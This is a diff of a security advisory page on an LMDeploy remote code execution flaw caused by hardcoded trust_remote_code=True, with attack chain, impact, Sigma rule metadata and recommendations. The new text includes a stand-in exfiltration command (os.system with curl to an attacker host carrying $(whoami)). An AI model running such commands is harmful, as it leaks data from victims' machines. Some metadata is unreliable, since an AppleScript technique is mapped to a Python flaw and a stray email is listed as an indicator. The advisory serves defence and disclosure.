@@ -1,80 +1,87 @@
 ---
-title: LMDeploy Arbitrary Code Execution via Hardcoded trust_remote_code=True
+title: LMDeploy Hardcoded trust_remote_code Enables Remote Code Execution (CVE-2026-46517)
 slug: 2026-05-lmdeploy-rce
-description: LMDeploy versions 0.12.3 and older are vulnerable to arbitrary code execution (CVE-2026-46432) due to the application hardcoding `trust_remote_code=True` when loading HuggingFace models, allowing an attacker to execute arbitrary Python code during model initialization.
-date: "2026-05-21T17:31:36Z"
+description: LMDeploy <= 0.12.3 is vulnerable to remote code execution (CVE-2026-46517) because it hardcodes `trust_remote_code=True` when calling `transformers.AutoConfig.from_pretrained()`, allowing a malicious Hugging Face repository to execute arbitrary Python code when loaded without user opt-out.
+date: "2026-05-21T19:34:00Z"
 type: advisory
 types:
   - advisory
 severities:
-  - high
+  - medium
 tags:
-  - arbitrary code execution
-  - huggingface
+  - remote code execution
+  - supply chain
   - lmdeploy
-  - trust_remote_code
 vendors:
-  - HuggingFace
+  - Hugging Face
+  - InternLM
 products:
-  - Transformers
+  - transformers
   - lmdeploy
 mitre_ttps:
   - tactic_id: TA0001
     tactic_name: Initial Access
-    technique_id: T1205
-    technique_name: Traffic Signaling
+    technique_id: T1199
+    technique_name: Trusted Relationship
   - tactic_id: TA0002
     tactic_name: Execution
-    technique_id: T1205
-    technique_name: Traffic Signaling
+    technique_id: T1059.002
+    technique_name: 'Command and Scripting Interpreter: AppleScript'
 references:
-  - https://github.com/advisories/GHSA-m549-qq94-fvhg
+  - https://github.com/advisories/GHSA-9xq9-36w5-q796
+iocs:
+  - type: email
+    value: sactransport2000@gmail.com
+ioc_counts:
+  email: 1
 rules:
-  - title: Detect Suspicious lmdeploy Model Loading
-    description: Detects suspicious model paths used with lmdeploy that may indicate an attempt to exploit the hardcoded `trust_remote_code=True` vulnerability (CVE-2026-46432)
-    platform: sigma
-    severity: high
-    tactics:
-      - execution
-      - initial_access
-    techniques:
-      - T1205
-    data_sources:
-      - process_creation
-      - linux
-  - title: Detect lmdeploy Trust Remote Code RCE Proof Marker File Creation
-    description: Detects the creation of the marker file used in the lmdeploy trust_remote_code RCE proof of concept (CVE-2026-46432).
+  - title: Detect LMDeploy Remote Code Execution via Configuration File Import
+    description: Detects CVE-2026-46517 exploitation — Monitors for process creation events where Python imports a configuration file from a Hugging Face Transformers cache, indicating potential remote code execution via a malicious model repository.
     platform: sigma
     severity: medium
     tactics:
       - execution
+      - initial_access
     techniques:
-      - T1205
+      - T1059.002
+      - T1199
     data_sources:
-      - file_event
-      - linux
+      - process_creation
+      - windows
+  - title: Detect Network Connections from Hugging Face Cache
+    description: Detects network connections initiated by Python processes originating from the Hugging Face Transformers cache directory, potentially indicating remote code execution.
+    platform: sigma
+    severity: low
+    tactics:
+      - command_and_control
+    techniques:
+      - T1071.001
+    data_sources:
+      - network_connection
+      - windows
 rules_count: 2
 ---
 
-LMDeploy is vulnerable to arbitrary code execution because it hardcodes `trust_remote_code=True` in multiple HuggingFace model-loading call sites within `lmdeploy/archs.py` and `lmdeploy/utils.py`. This affects calls to `AutoConfig.from_pretrained()`, `PretrainedConfig.get_config_dict()`, and `GenerationConfig.from_pretrained()`. An attacker who can control the `model_path` used by an lmdeploy serving process can point it to an attacker-controlled HuggingFace model repository. When lmdeploy starts and initializes the model, Transformers may download and execute remote Python code from that repository. This vulnerability affects lmdeploy versions 0.12.3 and earlier.
+LMDeploy, a toolkit for large model deployment, is vulnerable due to its hardcoded `trust_remote_code=True` setting within the `transformers.AutoConfig.from_pretrained()` function calls. This bypasses the default-secure stance of Hugging Face Transformers (≥ 4.30) and allows arbitrary Python code execution when a user loads a model from a malicious Hugging Face repository. Specifically, this issue affects users running `lmdeploy serve api_server`, `lmdeploy lite calibrate`, or other related commands against untrusted repositories. The vulnerability stems from the lack of user control over the `trust_remote_code` parameter, and is tracked as CVE-2026-46517. The affected version is lmdeploy <= 0.12.3.
 
 ## Attack Chain
 
-1. The attacker gains control over the `model_path` configuration used by lmdeploy.
-2. The attacker sets the `model_path` to a malicious HuggingFace repository, such as `attacker-org/malicious-model`.
-3. The lmdeploy serving process starts using the attacker-controlled model path via command-line argument (e.g., `lmdeploy serve api_server attacker-org/malicious-model`).
-4. During model initialization, lmdeploy calls `AutoConfig.from_pretrained()`, `PretrainedConfig.get_config_dict()`, or `GenerationConfig.from_pretrained()` with `trust_remote_code=True`.
-5. The HuggingFace Transformers library downloads Python code from the attacker's repository.
-6. Transformers executes the downloaded Python code within the lmdeploy process.
-7. The attacker gains arbitrary code execution with the privileges of the lmdeploy serving process.
+1.  Attacker creates a malicious Hugging Face repository containing a `config.json` file with an `auto_map` key pointing to a custom `configuration_evil.py` file.
+2.  The `configuration_evil.py` file contains malicious Python code, such as `os.system("curl https://attacker/?$(whoami)")`, designed to execute when imported.
+3.  A user, following a tutorial or benchmarking models, runs an lmdeploy command such as `lmdeploy serve api_server <attacker_repo>` or `lmdeploy lite calibrate <attacker_repo>`.
+4.  LMDeploy calls `transformers.AutoConfig.from_pretrained(model_path, trust_remote_code=True)` due to the hardcoded `trust_remote_code=True` in `lmdeploy/archs.py`, `lmdeploy/lite/apis/calibrate.py`, and `lmdeploy/lite/utils/load.py`.
+5.  Hugging Face Transformers downloads the `configuration_evil.py` file from the malicious repository.
+6.  Hugging Face Transformers imports the `configuration_evil.py` module, causing the malicious Python code to execute.
+7.  The attacker gains code execution on the user's machine with the privileges of the lmdeploy process.
+8.  The attacker can then perform actions such as stealing credentials, installing malware, or compromising the system.
 
 ## Impact
 
-Successful exploitation of this vulnerability allows an attacker to execute arbitrary Python code during model initialization. The attacker can read files accessible to the lmdeploy process, access environment variables, model provider credentials, cloud credentials, and API keys, modify model-serving behavior, execute operating-system commands, access request data, cause denial of service, and pivot to internal services. This can lead to complete compromise of the lmdeploy server and potentially the wider network.
+Successful exploitation allows an attacker to execute arbitrary code on the victim's machine. The impact includes potential data theft, system compromise, and further propagation of the attack. This vulnerability affects any user of LMDeploy who loads models from untrusted sources, impacting casual users, CI pipelines, and researchers. The vulnerability exists because LMDeploy overrides Hugging Face's default-secure stance without providing any warning or opt-out mechanism to the user.
 
 ## Recommendation
 
-*   Apply available patches as provided by the vendor. Upgrade to lmdeploy version 0.13.0 or later.
-*   As a workaround, ensure that the `model_path` configuration is sourced from a trusted source.
-*   Monitor lmdeploy processes for unexpected file creations in `/tmp` using the marker file path from the provided proof of concept.
-*   Deploy the Sigma rule `Detect Suspicious lmdeploy Model Loading` to detect potentially malicious model paths.
+*   Upgrade to a patched version of LMDeploy that includes a CLI flag for `--trust-remote-code` defaulting to False, as described in the Suggested fix section.
+*   Deploy the Sigma rule `Detect LMDeploy Remote Code Execution via Configuration File Import` to detect potential exploitation attempts by monitoring process creation events related to Python and file paths from the Hugging Face cache.
+*   Exercise extreme caution when loading models from untrusted Hugging Face repositories with LMDeploy, and avoid running LMDeploy commands against repositories that have not been thoroughly vetted.
+*   Monitor network connections initiated by Python processes originating from the Hugging Face Transformers cache directory, using a network connection monitoring rule.
